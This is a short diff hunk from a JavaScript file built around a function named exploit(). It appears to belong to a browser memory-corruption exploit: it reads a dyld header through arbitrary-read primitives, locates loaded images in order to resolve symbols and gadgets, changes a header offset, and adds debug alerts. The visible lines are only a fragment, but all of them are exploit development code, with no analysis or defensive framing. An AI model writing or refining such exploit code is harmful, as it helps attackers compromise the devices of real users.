@@ -709,7 +709,8 @@ function exploit(){
         var syms = {};
         var gadgets = {};
         alert("dyld base address" + memory.u32(hdr + 0x20))
-        var imgs  = Add(hdr, memory.u32(Add(hdr, 0x18)));
+        var imgs  = Add(hdr, memory.u32(Add(hdr, 0x88)));
+        alert("imgs"+imgs)
         var nimgs = memory.u32(Add(hdr, 0x1c));
         alert(nimgs + "n")
         for(var i = 0; i < nimgs; ++i)
